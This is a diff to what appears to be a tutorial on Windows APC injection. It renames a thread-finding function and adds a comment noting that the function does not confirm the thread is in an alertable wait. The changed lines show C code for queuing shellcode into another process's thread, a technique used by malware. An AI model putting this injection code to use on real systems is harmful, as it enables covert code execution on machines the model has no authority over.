@@ -136,8 +136,12 @@ Asynchronous Procedure Calls are a Windows mechanism for queuing work to a threa
 #include <windows.h>
 #include <tlhelp32.h>
 
-// Enumerate threads belonging to a target PID
-DWORD find_alertable_thread(DWORD pid) {
+// Enumerate threads belonging to a target PID and return the first one found.
+// Note: this does not verify that the thread is in an alertable wait state.
+// APC execution requires the target thread to call SleepEx, WaitForSingleObjectEx,
+// or similar with the bAlertable flag set. There is no user-mode API to check
+// this externally; threads in a UI message loop are typically alertable.
+DWORD find_thread_in_process(DWORD pid) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     THREADENTRY32 te = { .dwSize = sizeof(te) };
 
@@ -170,7 +174,7 @@ BOOL inject_apc(DWORD pid, uint8_t *shellcode, size_t sc_len) {
     DWORD old;
     VirtualProtectEx(proc, remote_buf, sc_len, PAGE_EXECUTE_READ, &old);
 
-    DWORD tid = find_alertable_thread(pid);
+    DWORD tid = find_thread_in_process(pid);
     HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
 
     // Queue APC to existing thread -- no new thread created
